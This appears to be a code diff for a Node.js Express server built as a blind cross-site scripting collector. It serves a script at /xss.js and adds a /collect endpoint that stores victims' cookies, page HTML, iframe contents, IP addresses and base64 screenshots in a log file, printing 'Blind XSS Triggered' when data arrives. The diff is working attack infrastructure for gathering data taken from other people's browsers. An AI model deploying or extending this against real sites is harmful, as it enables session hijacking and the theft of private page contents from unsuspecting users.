@@ -1,3 +1,18 @@
+const express = require('express');
+const fs = require('fs');
+const bodyParser = require('body-parser');
+const app = express();
+const PORT = process.env.PORT || 3000;
+
+// Create "screenshots" folder if not exists
+if (!fs.existsSync('screenshots')) {
+  fs.mkdirSync('screenshots');
+}
+
+app.use(bodyParser.json({ limit: '15mb' }));
+app.use(bodyParser.urlencoded({ extended: true }));
+
+// Serve the XSS payload at /xss.js
 app.get('/xss.js', (req, res) => {
   res.setHeader('Content-Type', 'application/javascript');
   res.send(`
@@ -25,4 +40,43 @@ app.get('/xss.js', (req, res) => {
       document.head.appendChild(s);
     })();
   `);
+});
+
+// Endpoint to receive data
+app.post('/collect', (req, res) => {
+  const {
+    screenshot, cookies, userAgent, referer,
+    origin, html, iframe, time
+  } = req.body;
+
+  const ip = req.headers['x-forwarded-for'] || req.connection.remoteAddress;
+
+  let screenshotPath = null;
+  if (screenshot) {
+    const base64Data = screenshot.replace(/^data:image\/png;base64,/, "");
+    screenshotPath = `screenshots/screenshot-${Date.now()}.png`;
+    fs.writeFileSync(screenshotPath, base64Data, 'base64');
+  }
+
+  const logEntry = {
+    ip,
+    userAgent,
+    referer,
+    origin,
+    cookies,
+    html,
+    iframe,
+    time,
+    screenshot: screenshotPath
+  };
+
+  console.log("🚨 Blind XSS Triggered:", logEntry);
+  fs.appendFileSync('logs.txt', JSON.stringify(logEntry) + "\n");
+
+  res.status(200).send('OK');
+});
+
+// Start server
+app.listen(PORT, () => {
+  console.log(`✅ Server is running on port ${PORT}`);
 });
